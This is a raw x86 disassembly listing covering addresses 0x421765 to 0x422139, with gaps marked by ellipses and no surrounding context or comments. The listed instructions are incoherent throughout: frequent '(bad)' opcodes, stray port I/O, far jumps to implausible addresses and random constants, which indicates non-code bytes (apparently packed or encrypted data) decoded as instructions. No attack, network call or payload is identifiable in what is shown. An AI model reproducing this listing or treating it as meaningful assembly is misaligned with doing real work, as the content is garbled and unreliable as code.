  421765:	imul   edx,edi,0x66
  421768:	add    DWORD PTR [eax],eax
  42176a:	inc    DWORD PTR [eax]
  42176c:	add    BYTE PTR [eax],al
  42176e:	popf   
  42176f:	sub    DWORD PTR [edi-0x1cedf386],edi
  421775:	jnp    0x421769
  421777:	(bad)  
  421778:	dec    edx
  421779:	cmp    eax,0xc7b7eef1
  42177e:	es pop edi
  421780:	fwait
  421781:	scas   eax,DWORD PTR es:[edi]
  421782:	jmp    FWORD PTR [eax-0x646bd22a]
  421788:	iret   
  421789:	fld    QWORD PTR [ebx+0x46]
  42178c:	sbb    dh,BYTE PTR [esi-0x1c]
  42178f:	in     al,dx
  421790:	cmp    esp,ebp
  421792:	dec    esp
  421793:	outs   dx,DWORD PTR ds:[esi]
  421794:	test   al,0xb6
  421796:	nop
  421797:	lahf   
  421798:	mov    esi,0x1893a5fb
  42179d:	lods   al,BYTE PTR gs:[esi]
  42179f:	adc    DWORD PTR [esi+ebx*1-0x417c3a8b],ecx
  4217a6:	clc    
  4217a7:	pop    ebx
  4217a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217a9:	xor    cl,BYTE PTR [ebx]
  4217ab:	adc    BYTE PTR [edx],ah
  4217ad:	dec    esp
  4217ae:	in     eax,0x1e
  4217b0:	test   eax,0x9398abde
  4217b5:	in     al,0x5e
  4217b7:	mov    cl,0xef
  4217b9:	pop    eax
  4217ba:	mov    dh,0x57
  4217bc:	mov    ebp,0x89ff6c9b
  4217c1:	lods   al,BYTE PTR ds:[esi]
  4217c2:	mov    ?,WORD PTR [ebp-0x6d7c3a8c]
  4217c8:	and    BYTE PTR [esi+0x67],0xad
  4217cc:	out    dx,al
  4217cd:	or     esp,DWORD PTR [edx+0x40eae0f9]
  4217d3:	mov    ecx,0xe09c583b
  4217d8:	mov    eax,0x88f3df4
  4217dd:	mov    esp,0x83e647c2
  4217e2:	xor    BYTE PTR [eax+0x55c8329f],cl
  4217e8:	xchg   ebp,eax
  4217e9:	push   edx
  4217ea:	rol    DWORD PTR [edi],1
  4217ec:	jne    0x421835
  4217ee:	cs retf 
  4217f0:	(bad)  
  4217f1:	out    0x12,al
  4217f3:	je     0x4217c5
  4217f5:	push   es
  4217f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217f7:	popf   
  4217f8:	xchg   edi,eax
  4217f9:	jl     0x42179d
  4217fb:	inc    esi
  4217fc:	push   ebp
  4217fd:	push   esi
  4217fe:	jge    0x42184e
  421800:	and    al,0x18
  421802:	mov    al,ds:0xd562bafd
  421807:	mov    esp,0x569f79e5
  42180c:	popa   
  42180d:	xchg   esp,eax
  42180e:	inc    edi
  42180f:	stos   DWORD PTR es:[edi],eax
  421810:	ucomiss xmm5,xmm1
  421813:	or     ebx,eax
  421815:	fsubr  st,st(5)
  421817:	mov    esp,DWORD PTR [eax+edx*4-0x2d]
  42181b:	test   DWORD PTR [ebx],eax
  42181d:	and    eax,DWORD PTR [ebx+0x54de34a]
  421823:	xchg   esi,eax
  421824:	jnp    0x421867
  421826:	mov    ch,al
  421828:	and    ecx,DWORD PTR [ebx-0x1bd49e06]
  42182e:	jge    0x42180d
  421830:	jne    0x4217da
  421832:	cmp    BYTE PTR [ebp-0x55],ch
  421835:	pop    edi
  421836:	mov    esp,0xecd275db
  42183b:	test   DWORD PTR ds:0x3c5a10db,esi
  421841:	xchg   edx,eax
  421842:	outs   dx,DWORD PTR ds:[esi]
  421843:	adc    al,0xb5
  421845:	dec    esi
  421846:	sbb    esi,ecx
  421848:	loope  0x4217f7
  42184a:	es xchg edi,eax
  42184c:	stc    
  42184d:	mov    cl,0x90
  42184f:	sub    BYTE PTR [ebx+eiz*1],0x3c
  421853:	(bad)  
  421854:	icebp  
  421855:	aad    0xe5
  421857:	sbb    DWORD PTR [eax-0xeec2878],ecx
  42185d:	xchg   cl,al
  42185f:	mov    dh,0x23
  421861:	test   eax,ecx
  421863:	pop    ebx
  421864:	fxch   st(0)
  421866:	loope  0x4217f1
  421868:	jmp    0x0:0x424b1cb2
	...
  4218d3:	add    BYTE PTR [eax],al
  4218d5:	add    cl,dl
  4218d7:	mov    al,ds:0xf9f9e0b9
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	aaa    
  4218e3:	add    esi,DWORD PTR [ecx+0x167d6a3]
  4218e9:	add    bh,bh
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [eax+esi*2+0x3eba87ff],cl
  4218f4:	push   ebx
  4218f5:	retf   
  4218f6:	mov    DWORD PTR [esi],esi
  4218f8:	jns    0x4218c2
  4218fa:	retf   
  4218fb:	scas   eax,DWORD PTR es:[edi]
  4218fc:	jle    0x4218c3
  4218fe:	js     0x4218f4
  421900:	xchg   BYTE PTR [eax],dl
  421902:	js     0x42195b
  421904:	add    DWORD PTR [esi],ecx
  421906:	cmp    edi,DWORD PTR [ecx+0x5d]
  421909:	and    eax,0x13d9d41d
  42190e:	cmp    BYTE PTR [ecx-0x66],dl
  421911:	mov    ds:0x55ffb3cb,eax
  421916:	and    edi,DWORD PTR [esi+eax*1+0x5a]
  42191a:	div    BYTE PTR [edi]
  42191c:	jns    0x4218c0
  42191e:	pop    edi
  42191f:	cli    
  421920:	pop    ecx
  421921:	add    al,0x46
  421923:	inc    esi
  421924:	add    al,0x59
  421926:	mov    edi,0x93878db6
  42192b:	imul   ebp,ebp,0xffffffa0
  42192e:	sahf   
  42192f:	pop    ebx
  421930:	or     al,0x62
  421932:	test   al,0x5c
  421934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421935:	call   0x81fd0ec1
  42193a:	jnp    0x4218e8
  42193c:	pop    ds
  42193d:	xchg   DWORD PTR [ebx],edx
  42193f:	xchg   BYTE PTR [ecx+0x4a],ch
  421942:	cmp    eax,0x4b29bfc6
  421947:	test   DWORD PTR [ecx-0x6b1367c0],esp
  42194d:	mov    bh,0x99
  42194f:	stos   DWORD PTR es:[edi],eax
  421950:	sbb    al,0xb
  421952:	xchg   ebp,eax
  421953:	push   edi
  421954:	sub    BYTE PTR [ebp-0x7161118c],bh
  42195a:	push   ebx
  42195b:	push   edx
  42195c:	pop    esp
  42195d:	sahf   
  42195e:	outs   dx,BYTE PTR ds:[esi]
  42195f:	xor    BYTE PTR [ecx+0x7f],0xa0
  421963:	dec    ebp
  421964:	lods   eax,DWORD PTR ds:[esi]
  421965:	js     0x4219d5
  421967:	adc    al,0xd
  421969:	(bad)  
  42196a:	aas    
  42196b:	lea    esp,[edi+0x443bf0c2]
  421971:	push   eax
  421972:	jbe    0x42198f
  421974:	and    DWORD PTR [esi-0x3b8696b5],0x74a44362
  42197e:	div    DWORD PTR [ebp+0x5fbf9d86]
  421984:	sub    bh,dh
  421986:	addr16 mov ebp,0x6b4da343
  42198c:	imul   eax,DWORD PTR [ebx+0x741aae5e],0x5f
  421993:	jecxz  0x4219e6
  421995:	mov    bh,0x85
  421997:	sbb    esp,eax
  421999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42199a:	mov    ebp,0x4a8e068e
  42199f:	xchg   ebp,eax
  4219a0:	xchg   esi,eax
  4219a1:	jmp    DWORD PTR [ebx+ebp*4+0x33]
  4219a5:	jl     0x421a19
  4219a7:	in     al,0xc1
  4219a9:	or     BYTE PTR [esi+0xa],dh
  4219ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219ad:	xchg   esi,eax
  4219ae:	gs pusha 
  4219b0:	test   BYTE PTR [edi-0x8],al
  4219b3:	out    0x35,al
  4219b5:	aam    0x9d
  4219b7:	retf   0xdd15
  4219ba:	push   esp
  4219bb:	pop    ds
  4219bc:	inc    edi
  4219bd:	or     ecx,DWORD PTR [edi+0x151888e4]
  4219c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219c4:	mov    eax,0x2ef0808b
  4219c9:	aam    0xa2
  4219cb:	fwait
  4219cc:	jnp    0x421a25
  4219ce:	shl    BYTE PTR [edx-0x57],1
  4219d1:	mov    dl,0x1a
  4219d3:	pushw  ds
  4219d5:	ror    bl,cl
  4219d7:	add    BYTE PTR [edi-0x4c0bbf92],al
  4219dd:	add    esp,DWORD PTR [edx+ebp*4-0x3c]
  4219e1:	fisub  WORD PTR [ebx]
  4219e3:	xor    al,BYTE PTR [ecx-0x5e]
  4219e6:	shr    edx,0xda
  4219e9:	xchg   ecx,eax
  4219ea:	fwait
  4219eb:	les    ecx,FWORD PTR [esi+0x0]
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	jmp    0x421a48
  421a64:	das    
  421a65:	cld    
  421a66:	aad    0x68
  421a68:	add    DWORD PTR [eax],eax
  421a6a:	inc    DWORD PTR [eax]
  421a6c:	add    BYTE PTR [eax],al
  421a6e:	cdq    
  421a6f:	pop    ds
  421a70:	mov    bl,0x70
  421a72:	mov    edi,0xfec8c675
  421a77:	sub    DWORD PTR [ebx+0x109a3df2],ebp
  421a7d:	ins    BYTE PTR es:[edi],dx
  421a7e:	pop    ss
  421a7f:	xchg   ebp,eax
  421a80:	and    eax,0xb8586a44
  421a85:	ficom  WORD PTR [esi*4+0x627ffbb1]
  421a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a8d:	inc    esi
  421a8e:	jnp    0x421a6e
  421a90:	mov    edx,0x90dbf4ba
  421a95:	ret    0x1714
  421a98:	sbb    BYTE PTR [ecx+0x12],0x92
  421a9c:	pop    ebp
  421a9d:	push   esi
  421a9e:	fst    DWORD PTR [esi-0x19f4c07e]
  421aa4:	stc    
  421aa5:	retf   0xeb16
  421aa8:	ss jg  0x421ad3
  421aab:	jbe    0x421a6d
  421aad:	xchg   ecx,eax
  421aae:	fwait
  421aaf:	push   esi
  421ab0:	xchg   ecx,eax
  421ab1:	aas    
  421ab2:	aas    
  421ab3:	xor    edi,DWORD PTR [ecx-0x69]
  421ab6:	mov    ah,0xe4
  421ab8:	out    0xfa,al
  421aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421abb:	xchg   esi,eax
  421abc:	aas    
  421abd:	lds    edi,FWORD PTR [ebx-0x552d84c0]
  421ac3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac5:	aam    0x83
  421ac7:	leave  
  421ac8:	xor    ebp,DWORD PTR [eax+edi*8-0x5c]
  421acc:	sub    edi,esp
  421ace:	jle    0x421b0f
  421ad0:	das    
  421ad1:	fnstenv [ebx-0x34a23440]
  421ad7:	sbb    esp,edx
  421ad9:	gs push 0xffffff85
  421adc:	sub    al,0x9a
  421ade:	mov    eax,0x8f7dec01
  421ae3:	mov    eax,ds:0xc333609c
  421ae8:	jo     0x421ace
  421aea:	xor    cl,0x26
  421aed:	inc    ebx
  421aee:	mov    bl,0xea
  421af0:	jns    0x421a7c
  421af2:	inc    esi
  421af3:	jp     0x421b32
  421af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421af6:	cmp    BYTE PTR [ecx-0x593aea1d],al
  421afc:	xchg   ecx,eax
  421afd:	mov    esp,0x2d6c8f9b
  421b02:	push   0xb4e77cbe
  421b07:	xchg   edx,esi
  421b09:	aas    
  421b0a:	imul   esp,DWORD PTR [edx-0x2fe3294f],0xe265c694
  421b14:	push   es
  421b15:	jmp    0xab91:0x954a4401
  421b1c:	arpl   WORD PTR [ecx-0x7e0ee2c],bp
  421b22:	out    dx,al
  421b23:	push   ss
  421b24:	mov    BYTE PTR [ebx+edx*1],dl
  421b27:	stc    
  421b28:	sbb    esi,DWORD PTR [ebx]
  421b2a:	outs   dx,DWORD PTR ds:[esi]
  421b2b:	xchg   DWORD PTR [ebx-0x25],esi
  421b2e:	mov    ds:0x30613bd2,al
  421b33:	mov    ebp,0xc879f35
  421b38:	(bad)  
  421b39:	jmp    0xd50bd02e
  421b3e:	xchg   ebp,eax
  421b3f:	cmc    
  421b40:	add    ch,bh
  421b42:	stos   DWORD PTR es:[edi],eax
  421b43:	or     eax,0x94d855ee
  421b48:	sub    eax,DWORD PTR [ecx-0x27]
  421b4b:	pop    ss
  421b4c:	dec    ecx
  421b4d:	mov    eax,DWORD PTR [ebp+0x49919d86]
  421b53:	rol    DWORD PTR [eax+0x18],0x7c
  421b57:	jge    0x421b3b
  421b59:	enter  0xaa37,0xaf
  421b5d:	jo     0x421bad
  421b5f:	sub    eax,edx
  421b61:	imul   esi,ecx,0x3124062f
  421b67:	jp     0x421b05
  421b69:	xchg   ebx,eax
  421b6a:	(bad)  
  421b6b:	jbe    0x421ba2
	...
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     bl,dh
  421be3:	leave  
  421be4:	mov    edi,0x169d4a1
  421be9:	add    bh,bh
  421beb:	add    BYTE PTR [eax],al
  421bed:	add    cl,bl
  421bef:	sub    ecx,DWORD PTR [esi-0x1b3f2616]
  421bf5:	js     0x421c69
  421bf7:	sahf   
  421bf8:	imul   esi,DWORD PTR [edi],0xd2f3db54
  421bfe:	sub    al,0x57
  421c00:	fisubr WORD PTR [eax]
  421c02:	mov    al,ds:0xea1e1d26
  421c07:	inc    esp
  421c08:	jle    0x421bfe
  421c0a:	sub    DWORD PTR [esi-0x1a],esp
  421c0d:	sbb    ebp,esp
  421c0f:	pop    ds
  421c10:	sbb    BYTE PTR [eax],ah
  421c12:	or     ecx,esi
  421c14:	sti    
  421c15:	pop    esi
  421c16:	popf   
  421c17:	push   esi
  421c18:	mov    cl,0x45
  421c1a:	xchg   esi,eax
  421c1b:	cmp    eax,0x69d7d77
  421c20:	pop    eax
  421c21:	inc    eax
  421c22:	test   DWORD PTR [edx-0x2d],ebx
  421c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c26:	ss dec ecx
  421c28:	hlt    
  421c29:	push   es
  421c2a:	lds    esi,FWORD PTR [esi-0x14937b28]
  421c30:	cmp    DWORD PTR [ebx],edx
  421c32:	pop    es
  421c33:	sub    al,0x0
  421c35:	addr16 in al,0xcb
  421c38:	ins    BYTE PTR es:[edi],dx
  421c39:	sbb    al,0xde
  421c3b:	(bad)  
  421c3d:	xor    BYTE PTR [edx+0x6c80c117],0x83
  421c44:	imul   DWORD PTR [edi+0x2e]
  421c47:	lahf   
  421c48:	pop    ebp
  421c49:	sti    
  421c4a:	shl    BYTE PTR [ecx+ebp*1-0x1c],1
  421c4e:	sti    
  421c4f:	out    dx,eax
  421c50:	jns    0x421c40
  421c52:	and    al,0xcf
  421c54:	sub    eax,0x810c860c
  421c59:	mov    bh,0x23
  421c5b:	fisub  DWORD PTR [esi-0x3c]
  421c5e:	dec    ebp
  421c5f:	je     0x421c9d
  421c61:	loopne 0x421c63
  421c63:	inc    eax
  421c64:	xchg   esi,eax
  421c65:	cmp    edx,0x9eb9403c
  421c6b:	jne    0x421c1b
  421c6d:	pop    edx
  421c6e:	hlt    
  421c6f:	mov    ebp,0x42884193
  421c74:	lahf   
  421c75:	sbb    BYTE PTR [edx-0x20],0xaf
  421c79:	(bad)  
  421c7a:	(bad)  
  421c7b:	addr16 fwait
  421c7d:	mov    dh,0x9a
  421c7f:	rol    BYTE PTR [ecx],1
  421c81:	sti    
  421c82:	add    eax,0x3a1ebc6
  421c87:	cmp    BYTE PTR [ebx+0x72],ah
  421c8a:	push   ebp
  421c8b:	pop    ecx
  421c8c:	iret   
  421c8d:	loopne 0x421cde
  421c8f:	mov    eax,0x7834a184
  421c94:	pop    ds
  421c95:	xor    al,BYTE PTR [ebp-0x4d]
  421c98:	sub    DWORD PTR [ebx-0x6e],eax
  421c9b:	jo     0x421c98
  421c9d:	leave  
  421c9e:	nop
  421c9f:	dec    esp
  421ca0:	sbb    ah,ah
  421ca2:	das    
  421ca3:	xchg   edi,eax
  421ca4:	or     al,0x44
  421ca6:	mov    al,0xe
  421ca8:	(bad)  
  421ca9:	mov    eax,ds:0xce25e85c
  421cae:	test   al,0x77
  421cb0:	cvtdq2ps xmm3,XMMWORD PTR [eax-0xb]
  421cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cb5:	es jae 0x421d10
  421cb8:	jns    0x421cc9
  421cba:	lock (bad) 
  421cbc:	outs   dx,BYTE PTR ds:[esi]
  421cbd:	cmp    dl,0xac
  421cc0:	sub    ah,dh
  421cc2:	mov    BYTE PTR [edx],cl
  421cc4:	cmp    DWORD PTR [esi],ecx
  421cc6:	cmp    BYTE PTR [eax],al
  421cc8:	out    dx,eax
  421cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cca:	mov    eax,0x8abe575
  421ccf:	(bad)  
  421cd0:	cli    
  421cd1:	mov    edi,0x7a5d44c0
  421cd6:	mov    bl,0xb7
  421cd8:	or     al,0xfe
  421cda:	adc    DWORD PTR [edi+0x3957f0e],ebx
  421ce0:	lahf   
  421ce1:	test   BYTE PTR [esi-0x23b5b05e],dh
  421ce7:	fcmovu st,st(6)
  421ce9:	adc    DWORD PTR ds:0x890c,0x0
	...
  421d53:	add    BYTE PTR [eax],al
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	push   ss
  421d63:	ins    DWORD PTR es:[edi],dx
  421d64:	aam    0x4f
  421d66:	shr    DWORD PTR [edx+0x1],cl
  421d69:	add    bh,bh
  421d6b:	add    BYTE PTR [eax],al
  421d6d:	add    BYTE PTR [edx],bh
  421d6f:	das    
  421d70:	mov    cl,0x8a
  421d72:	clc    
  421d73:	add    al,BYTE PTR [edi-0x7814faa]
  421d79:	xchg   ecx,eax
  421d7a:	lahf   
  421d7b:	push   ecx
  421d7c:	sbb    esp,DWORD PTR [ecx+0x7a]
  421d7f:	mov    edx,0x795268f2
  421d84:	inc    ebx
  421d85:	cmp    al,0x7d
  421d88:	mov    ah,0xf1
  421d8a:	dec    ebp
  421d8b:	push   eax
  421d8c:	jnp    0x421d1c
  421d8e:	leave  
  421d8f:	data16 and bh,cl
  421d92:	in     al,dx
  421d93:	sbb    al,0x11
  421d95:	and    edx,DWORD PTR [ebx+0x16]
  421d98:	jne    0x421dc7
  421d9a:	jmp    0xc6d8ea7e
  421d9f:	mov    ebx,0xd1a2ce4
  421da4:	enter  0x772f,0x68
  421da8:	call   0x50e9c948
  421dad:	inc    ecx
  421dae:	test   eax,0xe4bbb65f
  421db3:	xchg   BYTE PTR [edx+ebx*2],bl
  421db6:	pop    es
  421db7:	pop    eax
  421db8:	fcom   DWORD PTR [ebx-0xb]
  421dbb:	test   eax,0x4f12ab64
  421dc0:	sub    bl,BYTE PTR [ebx+eiz*1+0x240265a7]
  421dc7:	or     cl,dl
  421dc9:	outs   dx,DWORD PTR ds:[esi]
  421dca:	pop    ebx
  421dcb:	shl    eax,cl
  421dcd:	fwait
  421dce:	pop    ss
  421dcf:	xchg   ecx,eax
  421dd0:	stc    
  421dd1:	jo     0x421e46
  421dd3:	add    BYTE PTR [edx+0x11],bh
  421dd6:	cmp    BYTE PTR [eax+0x7f],ch
  421dd9:	dec    ebx
  421dda:	fadd   QWORD PTR [ebp+0x4db56cb5]
  421de0:	mov    al,ds:0xd768faf5
  421de5:	in     eax,dx
  421de6:	jo     0x421e00
  421de8:	dec    esi
  421de9:	dec    esi
  421dea:	xchg   ecx,eax
  421deb:	outs   dx,DWORD PTR ds:[esi]
  421dec:	mov    ds:0x511275fc,eax
  421df1:	std    
  421df2:	jns    0x421dd3
  421df4:	test   BYTE PTR [eax],dh
  421df6:	or     DWORD PTR [eax+0x6fc861d5],eax
  421dfc:	cmp    al,0x2e
  421dfe:	mov    bh,0x47
  421e00:	xor    BYTE PTR [ecx],dh
  421e02:	add    bh,BYTE PTR ds:0x97d5f514
  421e08:	mov    edi,edi
  421e0a:	xchg   edi,eax
  421e0b:	hlt    
  421e0c:	sub    DWORD PTR [eax-0x4e],esp
  421e0f:	push   eax
  421e10:	push   edx
  421e11:	cmc    
  421e12:	cli    
  421e13:	mov    ah,al
  421e15:	jne    0x421e8e
  421e17:	mov    ebp,DWORD PTR [ecx+0xb]
  421e1a:	stc    
  421e1b:	arpl   WORD PTR [ecx+0xf],si
  421e1e:	pop    es
  421e1f:	aad    0x89
  421e21:	xor    BYTE PTR [esp+eax*2-0x6f],bh
  421e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e26:	aas    
  421e27:	or     eax,esp
  421e29:	inc    esp
  421e2a:	jle    0x421dc1
  421e2c:	sub    eax,0xabdf120f
  421e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e32:	inc    esp
  421e33:	mov    bh,0x84
  421e35:	add    eax,0x264e76be
  421e3a:	or     BYTE PTR [ebp-0x50a9a1e6],0xbf
  421e41:	mov    ds:0x10312eec,al
  421e46:	xor    esi,DWORD PTR [edi+0x79]
  421e49:	adc    BYTE PTR [ecx-0x73917aba],0xf8
  421e50:	sbb    BYTE PTR [esi],cl
  421e52:	ret    
  421e53:	(bad)
  421e56:	jge    0x421dff
  421e58:	mov    dh,0x8b
  421e5a:	pop    esp
  421e5b:	jns    0x421ebc
  421e5d:	arpl   WORD PTR es:[ebx],bx
  421e60:	mov    esp,0x602932f6
  421e65:	lea    esp,fs:[edi]
  421e68:	mov    edx,0x3dde337e
	...
  421ed5:	add    bh,cl
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	jno    0x421f36
  421ee4:	out    dx,al
  421ee5:	in     al,0xd2
  421ee7:	imul   eax,DWORD PTR [ecx],0x0
  421eea:	inc    DWORD PTR [eax]
  421eec:	add    BYTE PTR [eax],al
  421eee:	push   0x361b31af
  421ef3:	jmp    0xf083:0xbb18f0a6
  421efa:	mov    eax,0x79e6653c
  421eff:	fnstenv ds:0x9fdf1d7d
  421f05:	xchg   edi,eax
  421f06:	push   esp
  421f07:	test   BYTE PTR [eax],ah
  421f09:	or     BYTE PTR [edi],0xfc
  421f0c:	add    eax,0x4575725a
  421f11:	jbe    0x421f05
  421f13:	cdq    
  421f14:	mov    bl,0xb8
  421f16:	add    ecx,DWORD PTR [eax+0x17]
  421f19:	stos   DWORD PTR es:[edi],eax
  421f1a:	ds scas al,BYTE PTR es:[edi]
  421f1c:	or     al,0xaa
  421f1e:	out    dx,al
  421f1f:	inc    esp
  421f20:	mov    ds:0x49e83338,al
  421f25:	pop    esp
  421f26:	pop    edi
  421f27:	retf   
  421f28:	cmc    
  421f29:	ret    
  421f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f2b:	sub    BYTE PTR [eax],al
  421f2d:	int    0xa6
  421f2f:	mov    bh,0xe4
  421f31:	pop    ds
  421f32:	xchg   DWORD PTR [ebp+esi*2+0x6004db7],esp
  421f39:	pusha  
  421f3a:	push   es
  421f3b:	pop    DWORD PTR [edx-0x63]
  421f3e:	and    al,0xa6
  421f40:	add    eax,0x32617df4
  421f45:	sbb    dl,ch
  421f47:	iret   
  421f48:	push   ecx
  421f49:	aad    0x10
  421f4b:	dec    eax
  421f4c:	cdq    
  421f4d:	sbb    al,0x62
  421f4f:	push   ebx
  421f50:	enter  0xcb28,0xe4
  421f54:	call   0x57343a6e
  421f59:	inc    esp
  421f5a:	push   cs
  421f5b:	pop    edi
  421f5c:	and    eax,0xa5debf11
  421f61:	add    ecx,DWORD PTR [ebx-0x47]
  421f64:	pop    edi
  421f65:	xor    al,0xe7
  421f67:	add    DWORD PTR [edx-0x65],ecx
  421f6a:	push   ebx
  421f6b:	xchg   ebp,eax
  421f6c:	test   al,0xeb
  421f6e:	sub    DWORD PTR [esi+0x18d2214a],0x24
  421f75:	inc    esi
  421f76:	and    al,0x92
  421f78:	dec    edi
  421f79:	mov    bl,0xee
  421f7b:	adc    eax,0x782e6e4d
  421f80:	push   edi
  421f81:	adc    ecx,DWORD PTR ds:0x924a52fe
  421f87:	(bad)  
  421f89:	mov    esp,0x4ad6cb6d
  421f8e:	gs push cs
  421f90:	mov    ds:0x88a74a14,al
  421f95:	xchg   ebx,eax
  421f96:	or     BYTE PTR [esi],0x65
  421f99:	cwde   
  421f9a:	adc    DWORD PTR [esi+0x29493096],ecx
  421fa0:	dec    edi
  421fa1:	das    
  421fa2:	xlat   BYTE PTR cs:[ebx]
  421fa4:	test   al,0xe
  421fa6:	adc    cl,BYTE PTR [ebp-0x68]
  421fa9:	addr16 ja 0x422029
  421fac:	mul    DWORD PTR [edi+eiz*2]
  421faf:	nop
  421fb0:	fisttp DWORD PTR [ebp-0x18]
  421fb3:	and    edi,0x3f
  421fb6:	test   eax,0x480f6734
  421fbb:	int3   
  421fbc:	mov    DWORD PTR [eax-0x6b],eax
  421fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fc0:	mov    ds:0xd34582de,eax
  421fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fc6:	and    esi,0x8c634b72
  421fcc:	adc    dh,BYTE PTR [ebx+0x4194d4bd]
  421fd2:	daa    
  421fd3:	inc    ecx
  421fd4:	push   ds
  421fd5:	mov    WORD PTR [ebp+ebp*8+0x7a],fs
  421fd9:	in     al,0x74
  421fdb:	sub    BYTE PTR [esi+ebp*1+0x59c2d45a],0x7
  421fe3:	xchg   esi,eax
  421fe4:	add    DWORD PTR [edi],eax
  421fe6:	imul   edi,edi,0x35c5f36d
  421fec:	inc    ecx
	...
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 mov ?,WORD PTR [edx+0x6cd16d0c]
  422068:	add    DWORD PTR [eax],eax
  42206a:	inc    DWORD PTR [eax]
  42206c:	add    BYTE PTR [eax],al
  42206e:	mov    esi,0xf5d54b0b
  422073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422074:	or     ah,cl
  422076:	rcl    BYTE PTR [ebp-0x19],cl
  422079:	stc    
  42207a:	sahf   
  42207b:	xor    BYTE PTR fs:[edx-0x525eb43b],0xf0
  422083:	xlat   BYTE PTR ds:[ebx]
  422084:	sub    BYTE PTR [ecx+0x472c7431],al
  42208a:	adc    ah,BYTE PTR [ecx+edx*1]
  42208d:	fucomi st,st(6)
  42208f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422090:	jp     0x4220e4
  422092:	add    ah,BYTE PTR [ecx+0x63]
  422095:	mov    WORD PTR [esi-0x6d],?
  422098:	stc    
  422099:	ds mov edx,0x53fc3522
  42209f:	mov    bl,0x62
  4220a1:	jl     0x4220b9
  4220a3:	in     al,dx
  4220a4:	push   ebx
  4220a5:	cmp    bh,BYTE PTR [edx+0xfed0226]
  4220ab:	xchg   edx,eax
  4220ac:	scas   al,BYTE PTR es:[edi]
  4220ad:	outs   dx,DWORD PTR ds:[esi]
  4220ae:	xchg   edi,eax
  4220af:	ds and ch,dh
  4220b2:	pop    ecx
  4220b3:	add    al,0xa1
  4220b5:	xchg   esi,eax
  4220b6:	ds dec esp
  4220b8:	inc    esi
  4220b9:	ffree  st(6)
  4220bb:	out    dx,eax
  4220bc:	int3   
  4220bd:	mov    edx,0x9f27e294
  4220c2:	add    al,0xcd
  4220c4:	mov    edx,0xfa3830e2
  4220c9:	inc    edi
  4220ca:	out    dx,eax
  4220cb:	lods   eax,DWORD PTR ds:[esi]
  4220cc:	pmullw mm6,QWORD PTR [esi-0x4d2fb3c0]
  4220d3:	popa   
  4220d4:	pop    edi
  4220d5:	enter  0x3bf2,0xd5
  4220d9:	leave  
  4220da:	sbb    DWORD PTR [edx+edx*2-0x6b],ebx
  4220de:	jo     0x422133
  4220e0:	jp     0x4220fd
  4220e2:	ins    BYTE PTR es:[edi],dx
  4220e3:	enter  0x20d2,0x9f
  4220e7:	push   edi
  4220e8:	aaa    
  4220e9:	icebp  
  4220ea:	jecxz  0x42208a
  4220ec:	inc    ebx
  4220ed:	loop   0x422103
  4220ef:	or     BYTE PTR [esi-0x58],ch
  4220f2:	inc    eax
  4220f3:	ins    DWORD PTR es:[edi],dx
  4220f4:	xor    eax,0xeff774d3
  4220f9:	mov    gs,WORD PTR [ecx]
  4220fb:	inc    edi
  4220fc:	add    al,0x13
  4220fe:	and    dl,ah
  422100:	cld    
  422101:	jecxz  0x422117
  422103:	mov    dh,0x70
  422105:	jae    0x4220d5
  422107:	sub    edx,DWORD PTR [edi+0x5b309ca2]
  42210d:	in     eax,dx
  42210e:	loopne 0x422101
  422110:	and    BYTE PTR ds:0x77dfe1b,dl
  422116:	stc    
  422117:	arpl   cx,si
  422119:	pusha  
  42211a:	and    BYTE PTR [edx],0xe9
  42211d:	and    DWORD PTR [eax],ebx
  42211f:	and    BYTE PTR [eax],0x7c
  422122:	imul   ebx,DWORD PTR gs:[esi],0x63
  422126:	bound  ebp,QWORD PTR [edi+0x47]
  422129:	jae    0x422116
  42212b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42212c:	sbb    BYTE PTR [ecx],0x46
  42212f:	in     eax,dx
  422130:	ret    
  422131:	push   cs
  422132:	ret    0x91e9
  422135:	dec    eax
  422136:	stc    
  422137:	push   ss
  422138:	inc    esi
  422139:	mov    ds:0x80bb87db,al
